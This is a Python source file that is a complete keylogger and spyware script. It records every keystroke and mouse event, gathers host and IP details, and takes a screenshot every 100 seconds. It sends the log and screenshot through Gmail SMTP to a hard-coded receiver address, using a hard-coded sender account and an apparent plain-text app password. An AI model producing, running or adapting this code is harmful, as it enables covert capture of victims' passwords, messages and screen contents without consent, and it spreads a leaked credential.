import logging
import datetime
from pynput import keyboard, mouse
from PIL import ImageGrab
import time
import platform
import socket
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart 
from email.mime.application import MIMEApplication
from email.mime.image import MIMEImage

def on_press(key):
    logging.info('Key {} pressed.'.format(key))

def on_release(key):
    logging.info('Key {} released.'.format(key))
    if key == keyboard.Key.esc:
        return False

def on_move(x, y):
    logging.info('Pointer moved to ({}, {}).'.format(x, y))

def on_click(x, y, button, pressed):
    if pressed:
        logging.info('Mouse button {} pressed at ({}, {}).'.format(button, x, y))
    else:
        logging.info('Mouse button {} released at ({}, {}).'.format(button, x, y))
        
def on_scroll(x, y, dx, dy):
    logging.info('Mouse scrolled at ({}, {}) with delta ({}, {}).'.format(x, y, dx, dy))

def take_screenshot():
    img = ImageGrab.grab()
    img.save("screenshot.png")
    logging.info("Screenshot taken.")
    
def system_information():
    hostname = socket.gethostname()
    ip = socket.gethostbyname(hostname)
    plat = platform.processor()
    system = platform.system()
    machine = platform.machine()
    logging.info(hostname)
    logging.info(ip)
    logging.info(plat)
    logging.info(system)
    logging.info(machine)
    
def send_mail(sender,receiver,file):   
    msg = MIMEMultipart()

    m = f"""\
    Subject: Key details
    To: {receiver}
    From: {sender}\n\n"""

    m += 'Active at '+datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    msg.attach(MIMEText(m, 'plain'))

    # Set up the SMTP server
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(sender, 'zpraumqsdfeyfhex')
    
    with open(file, 'rb') as f:
        attach = MIMEApplication(f.read(), _subtype='txt')
        attach.add_header('Content-Disposition', 'attachment', filename=file)
        msg.attach(attach)
    with open('screenshot.png', 'rb') as f:
        img = MIMEImage(f.read())
        img.add_header('Content-Disposition', 'attachment', filename='screenshot.png')
        msg.attach(img)

    # Send the email
    text = msg.as_string()
    server.sendmail(sender,receiver, text)

    # Close the SMTP server connection
    server.quit()
    
def run(sender,receiver,file):
    system_information()
    
    keyboard_listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    keyboard_listener.start()
    mouse_listener = mouse.Listener(on_move=on_move, on_click=on_click)
    mouse_listener.start()
    while True:
        take_screenshot()
        send_mail(sender, receiver, file)
        time.sleep(100)
        
file='keylogger'
file+='.log'
logging.basicConfig(filename=file, level=logging.INFO)
sender = 'genztitans.641@gmail.com'
receiver = '21pc39@psgtech.ac.in'
run(sender,receiver,file)







